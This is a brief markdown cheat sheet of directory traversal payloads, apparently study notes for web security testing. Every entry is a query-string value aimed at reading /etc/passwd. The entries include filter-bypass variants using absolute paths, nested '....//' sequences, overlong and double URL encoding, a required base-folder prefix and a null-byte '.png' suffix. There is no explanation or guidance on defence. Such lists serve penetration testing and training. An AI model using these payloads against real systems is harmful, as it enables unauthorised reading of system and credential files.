### Simple:
- ?filename=../../../etc/passwd

## Stripping away of directory traversal sequences by application:
### Try to use absolute filepath:
- ?filename=/etc/passwd

### Try to use nested traversal sequences:
- ?filename=....//....//....//etc/passwd

### Try to use non-standard encodings:
- ?filename=..%c0%af..%c0%af..%c0%afetc/passwd
- ?filename=..%252f..%252f..%252fetc/passwd

### If it must start with a expected base folder like /var/www/images:
- ?filename=/var/www/images/../../../etc/passwd

### If it expects a specific file extension like .png:
- ?filename=../../../etc/passwd%00.png